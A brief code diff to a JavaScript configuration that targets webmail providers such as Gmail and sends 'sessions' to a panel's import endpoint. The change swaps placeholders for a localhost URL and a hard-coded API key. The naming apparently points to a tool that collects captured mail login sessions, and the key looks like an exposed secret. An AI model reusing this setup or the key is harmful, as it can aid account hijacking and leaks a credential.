@@ -4,8 +4,8 @@
 const CONFIG = {
     provider: 'google',  // or 'outlook', 'yahoo', 'custom'
     targetUrl: 'https://mail.google.com',
-    panelEndpoint: 'https://your-panel.com/api/sessions/import',
-    apiKey: 'your-api-key',
+    panelEndpoint: 'http://localhost:8003/api/outlook/sessions/import',
+    apiKey: 'EKSXpcIGA9IzZEvsMvmwp_VF7ob1cBKJb1YYP_juPiI',
     
     // For custom providers
     loginPath: '/login',
